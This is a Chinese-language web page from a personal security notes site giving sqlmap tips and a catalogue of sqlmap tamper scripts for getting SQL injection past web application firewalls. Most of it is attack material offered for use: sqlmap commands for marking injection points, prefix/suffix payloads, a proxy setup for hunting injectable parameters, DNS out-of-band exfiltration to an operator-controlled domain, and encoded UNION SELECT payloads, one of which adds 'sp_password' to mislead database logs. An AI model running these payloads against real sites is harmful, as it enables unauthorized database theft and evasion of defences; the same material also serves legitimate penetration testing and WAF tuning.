@@ -1,0 +1,353 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>一、sqlmap tips｜Web 安全 / 注入与请求伪造｜BEN.OPS</title>
+  <meta name="description" content="一、sqlmap tips。本文属于Web 安全 / 注入与请求伪造，2). For urls that are not in the form of param=value sqlmap cannot automatically know where to inject. For example mvc url…">
+  <meta name="keywords" content="Web 安全，注入与请求伪造，DNS，MySQL，MSSQL，PHP，SQL注入，WAF，Web 安全 / 注入与请求伪造，一、sqlmap tips">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-3017a3fe5465.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-3017a3fe5465.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2B%E6%B3%A8%E5%85%A5%E4%B8%8E%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%2BDNS%2BMySQL-%E4%B8%80%E3%80%81sqlmap%20tips.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="一、sqlmap tips">
+  <meta property="og:description" content="一、sqlmap tips。本文属于Web 安全 / 注入与请求伪造，2). For urls that are not in the form of param=value sqlmap cannot automatically know where to inject. For example mvc url…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-3017a3fe5465.html">
+  <meta property="article:published_time" content="2023-04-14T16:00:00">
+  <meta property="article:modified_time" content="2023-04-14 16:00">
+  <meta property="article:section" content="Web 安全 / 注入与请求伪造">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="一、sqlmap tips">
+  <meta name="twitter:description" content="一、sqlmap tips。本文属于Web 安全 / 注入与请求伪造，2). For urls that are not in the form of param=value sqlmap cannot automatically know where to inject. For example mvc url…">
+  
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-3017a3fe5465.html#article","headline":"一、sqlmap tips","description":"一、sqlmap tips。本文属于Web 安全 / 注入与请求伪造，2). For urls that are not in the form of param=value sqlmap cannot automatically know where to inject. For example mvc url…","datePublished":"2023-04-14T16:00:00","dateModified":"2023-04-14 16:00","inLanguage":"zh-CN","articleSection":["Web 安全","注入与请求伪造"],"keywords":["Web 安全","注入与请求伪造","DNS","MySQL","MSSQL","PHP","SQL注入","WAF","Web 安全 / 注入与请求伪造","一、sqlmap tips"],"wordCount":1992,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-3017a3fe5465.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-3017a3fe5465.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"Web 安全 / 注入与请求伪造","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"一、sqlmap tips","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-3017a3fe5465.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>Web 安全 / 注入与请求伪造</span> › <span>一、sqlmap tips</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">Web 安全 / 注入与请求伪造</div>
+      <h1>一、sqlmap tips</h1>
+      <p class="lede">一、sqlmap tips。本文属于Web 安全 / 注入与请求伪造，2). For urls that are not in the form of param=value sqlmap cannot automatically know where to inject. For example mvc url…</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T16:00:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">1,992 字</span>
+        <span class="badge">6 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<h2 id="一-sqlmap-tips">一、sqlmap tips</h2>
+<p>1). Sometimes sqlmap is unable to connect to the url at all. This is visible when it gets stuck at the first task of "testing connection to the target url". In such cases its helpful to use the "--random-agent" option. This makes sqlmap to use a valid user agent signature like the ones send by a browser like chrome or firefox.</p>
+<p>2). For urls that are not in the form of param=value sqlmap cannot automatically know where to inject. For example mvc urls like <code>http://www.site.com/class_name/method/43/80</code>.</p>
+<p>In such cases sqlmap needs to be told the injection point marked by a *</p>
+<p><code>http://www.site.com/class_name/method/43*/80</code></p>
+<p>The above will tell sqlmap to inject at the point marked by *</p>
+<p>3).明明扫描器扫出来的，手工测试也过了，可一到sqlmap就是302。
+可能是要重定向到error 页面，这种情况有时属于正常状况（部分boolean-based payload 会导致），但是总是这样，可能是referer（扫描器请求中找）中有限制，或者cookie要登陆，再或者是user-agent 需要换。</p>
+<p>4).sqlmap 默认测试所有的GET和POST 参数，当--level &gt;=2 的时候也会测试 HTTP Cookie头的值，当&gt;=3的时候也会测试User-Agent 和HTTP Referer头的值。但是你可以手动用-p 参数设置想要测试的参数。例如： -p "id,user-agent"</p>
+<p>当你使用--level 的值很大但是有个别参数不想测试的时候可以使用--skip 参数。例如：--skip="user-agent,referer"</p>
+<p>在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*</p>
+<p>例如：<code>python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"</code></p>
+<p>sqlmap将会测试value1的位置是否可注入。</p>
+<p>5).参数：--prefix, --suffix</p>
+<p>在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload 的正常执行。</p>
+<p>例如，代码中是这样调用数据库的：</p>
+<p><code>$query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";</code></p>
+<p>这时你就需要--prefix和--suffix参数了：</p>
+<p><code>python sqlmap.py -u "http://203.0.113.1/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"</code></p>
+<p>这样执行的SQL语句变成：<code>$query = "SELECT * FROM users WHERE id=('1') &lt;PAYLOAD&gt; AND ('abc'='abc') LIMIT 0, 1"</code>;</p>
+<p>6).有些时候网站会“不小心”过滤掉各种字符，可以用tamper来解决（对付某些waf 时也有成效）
+把空格过滤掉了（应该还有所有不可见字符）
+--tamper=”space2comment.py”
+理论是用/**/代替空格
+同时如果过滤了其他字符，也可查阅手册可用的tamper选项。</p>
+<p>7).结合sqlmapapi + <a href="https://github.com/zt2/sqli-hunter" rel="noopener noreferrer">sqli-hunter</a> 查找注入点
+开启 sqlmapapi python sqlmapapi.py -s
+开始 sqli-hunter 代理 ruby sqli-hunter.rb -p 8888
+设置浏览器代理为 8888端口，然后用鼠标去点击网页上的各种链接，会传递到sqli-hunter的代理服务器上，sqli-hunter与sqlmapapi交互检测注入点。检测到注入点会保存在tmp目录，使用sqlmap的-r参数进行注入就好了。</p>
+<p>8). 使用sqlmap的dns-domain参数进行oob(out of band)注入</p>
+<p>使用方法：sqlmap使用--dns-domain参数时候会监听53端口，我们需要把我们获得数据所使用的域名的dns服务器配置到我们运行sqlmap的主机，就可以获得dns外带的数据。
+因为配置dns服务器的时候也需要dns，所以我们需要两个域名，详细配置如下：
+配置我们的用于解析dns的nameserver的域名ns1.xxx.com,ns2.xxx.com指向我们运行sqlmap的主机ip。
+配置我们用于外带数据的域名rainism.cc的域名服务器为ns1.xxx.com和ns2.xxx.com 。
+我们在外网的vps上执行如下命令</p>
+<p><code>sqlmap.py -u 'http://xxoo.com/index.php?id=1*' --random-agent --dns-domain='rainism.cc' -v 3</code></p>
+<p>可以看到sqlmap执行的语句和返回的数据。</p>
+<h2 id="二-SqlMap绕过WAF实例">二、SqlMap绕过WAF实例</h2>
+<p>apostrophemask.py UTF-8编码
+Example:
+- Input: AND '1'='1'
+- Output: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87</p>
+<p>apostrophenullencode.py unicode编码
+Example:
+- Input: AND '1'='1'
+- Output: AND %00%271%00%27=%00%271%00%27</p>
+<p>appendnullbyte.py 添加%00
+Example:
+- Input: AND 1=1
+- Output: AND 1=1%00
+Requirement:
+- Microsoft Access</p>
+<p>base64encode.py base64编码
+Example:
+- Input: 1' AND SLEEP(5)#
+- Output: MScgQU5EIFNMRUVQKDUpIw==</p>
+<p>between.py 以“not between”替换“&gt;”
+Example:
+- Input: 'A &gt; B'
+- Output: 'A NOT BETWEEN 0 AND B'</p>
+<p>bluecoat.py 以随机的空白字符替代空格，以“like”替代“=”
+Example:
+- Input: SELECT id FROM users where id = 1
+- Output: SELECT%09id FROM users where id LIKE 1
+Requirement:
+- MySQL 5.1, SGOS</p>
+<p>chardoubleencode.py 双重url编码
+Example:
+- Input: SELECT FIELD FROM%20TABLE
+- Output: <code>%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</code></p>
+<p>charencode.py url编码
+Example:
+- Input: SELECT FIELD FROM%20TABLE
+- Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</p>
+<p>charunicodeencode.py 对未进行url编码的字符进行unicode编码
+Example:
+- Input: SELECT FIELD%20FROM TABLE
+- Output: <code>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045'</code>
+Requirement:
+- ASP
+- ASP.NET</p>
+<p>equaltolike.py 以“like”替代“=”
+Example:
+- Input: SELECT * FROM users WHERE id=1
+- Output: SELECT * FROM users WHERE id LIKE 1</p>
+<p>halfversionedmorekeywords.py在每个关键字前添加条件注释
+Example:
+- Input: <code>value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa</code>
+- Output: <code>value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND 'QDWa'='QDWa</code>
+Requirement:
+- MySQL &lt; 5.1</p>
+<p>ifnull2ifisnull.py 以“IF(ISNULL(A), B, A)”替换“IFNULL(A, B)”
+Example:
+- Input: IFNULL(1, 2)
+- Output: IF(ISNULL(1), 2, 1)
+Requirement:
+- MySQL
+- SQLite (possibly)
+- SAP MaxDB (possibly)</p>
+<p>modsecurityversioned.py 条件注释
+Example:
+- Input: 1 AND 2&gt;1--
+- Output: <code>1 /*!30000AND 2&gt;1*/--</code>
+Requirement:
+- MySQL</p>
+<p>modsecurityzeroversioned.py 条件注释，0000
+Example:
+- Input: 1 AND 2&gt;1--
+- Output: <code>1 /*!00000AND 2&gt;1*/--</code>
+Requirement:
+- MySQL</p>
+<p>multiplespaces.py 添加多个空格
+Example:
+- Input: UNION SELECT
+- Output:  UNION      SELECT</p>
+<p>nonrecursivereplacement.py 可以绕过对关键字删除的防注入
+Example:
+- Input: 1 UNION SELECT 2--
+- Output: 1 UNUNIONION SELSELECTECT 2--</p>
+<p>percentage.py 在每个字符前添加百分号（%）
+Example:
+- Input: SELECT FIELD FROM TABLE
+- Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E
+Requirement:
+- ASP</p>
+<p>randomcase.py 随即大小写
+Example:
+- Input: INSERT
+- Output: InsERt</p>
+<p>randomcomments.py 随机插入区块注释
+Example:
+'INSERT' becomes <code>'IN/**/S/**/ERT'</code></p>
+<p>securesphere.py 语句结尾添加“真”字符串
+Example:
+- Input: AND 1=1
+- Output: AND 1=1 and '0having'='0having'</p>
+<p>sp_password.py 语句结尾添加“sp_password”迷惑数据库日志
+Example:
+- Input: 1 AND 9227=9227--
+- Output: 1 AND 9227=9227--sp_password
+Requirement:
+- MSSQL</p>
+<p>space2comment.py 以区块注释替换空格
+Example:
+- Input: SELECT id FROM users
+- Output:<code>SELECT/**/id/**/FROM/**/users</code></p>
+<p>space2dash.py 以单行注释“--”和随机的新行替换空格
+Example:
+- Input: 1 AND 9227=9227
+- Output: 1--PTTmJopxdWJ%0AAND--cWfcVRPV%0A9227=9227
+Requirement:
+- MSSQL
+- SQLite</p>
+<p>space2hash.py 以单行注释“#”和由随机字符组成的新行替换空格
+Example:
+- Input: 1 AND 9227=9227
+- Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227
+Requirement:
+- MySQL</p>
+<p>space2morehash.py 没看出来和上面那个有什么区别
+Requirement:
+- MySQL &gt;= 5.1.13</p>
+<p>space2mssqlblank.py 以随机空白字符替换空格
+Example:
+- Input: SELECT id FROM users
+- Output: SELECT%08id%02FROM%0Fusers
+Requirement:
+- Microsoft SQL Server</p>
+<p>space2mssqlhash.py 以单行注释“#”和新行替换空格
+Example:
+- Input: 1 AND 9227=9227
+- Output: 1%23%0A9227=9227
+Requirement:
+- MSSQL
+- MySQL</p>
+<p>space2mysqlblank.py 以随机空白字符替换空格
+Example:
+- Input: SELECT id FROM users
+- Output: SELECT%0Bid%0BFROM%A0users
+Requirement:
+- MySQL</p>
+<p>space2mysqldash.py 以单行注释和新行替换空格
+Example:
+- Input: 1 AND 9227=9227
+- Output: 1--%0AAND--%0A9227=9227
+Requirement:
+- MySQL
+- MSSQL</p>
+<p>space2plus.py 以“+”替换空格
+Example:
+- Input: SELECT id FROM users
+- Output: SELECT+id+FROM+users</p>
+<p>space2randomblank.py 随机空白字符替换空格
+Example:
+- Input: SELECT id FROM users
+- Output: SELECT\rid\tFROM\nusers</p>
+<p>unionalltounion.py 以“union”替换“union all”
+Example:
+- Input: -1 UNION ALL SELECT
+- Output: -1 UNION SELECT</p>
+<p>unmagicquotes.py 以“%bf%27”替换单引号，并在结尾添加注释“--”
+Example:
+- Input: 1' AND 1=1
+- Output: 1%bf%27 AND 1=1--%20</p>
+<p>versionedkeywords.py 对不是函数的关键字条件注释
+Example:
+- Input: <code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</code>
+- Output:  <code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code>
+Requirement:
+- MySQL</p>
+<p>versionedmorekeywords.py 对关键字条件注释
+Example:
+- <code>Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</code>
+- Output: <code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#</code>
+Requirement:
+- MySQL &gt;= 5.1.13</p>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#一-sqlmap-tips">一、sqlmap tips</a></li><li style="margin-left:0.0rem"><a href="#二-SqlMap绕过WAF实例">二、SqlMap绕过WAF实例</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：Web 安全 / 注入与请求伪造</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">Web 安全</span><span class="tag">注入与请求伪造</span><span class="tag">DNS</span><span class="tag">MySQL</span><span class="tag">MSSQL</span><span class="tag">PHP</span><span class="tag">SQL注入</span><span class="tag">WAF</span></li>
+          <li><span>来源：01-Web安全/02-注入与请求伪造/SQL注入/sqlmap tips.md</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2B%E6%B3%A8%E5%85%A5%E4%B8%8E%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%2BDNS%2BMySQL-%E4%B8%80%E3%80%81sqlmap%20tips.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>一、sqlmap tips。本文属于Web 安全 / 注入与请求伪造，2). For urls that are not in the form of param=value sqlmap cannot automatically know where to inject. For example mvc url…</p>
+      <p>关键词：Web 安全、注入与请求伪造、DNS、MySQL、MSSQL、PHP、SQL注入、WAF、Web 安全 / 注入与请求伪造、一、sqlmap tips</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b63de059884b.html"><small>上一篇</small>一、php: addslashes()、mysqlescapestring()</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-83782ec960bc.html"><small>下一篇</small>一、什么是跨站脚本漏洞</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-3017a3fe5465.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
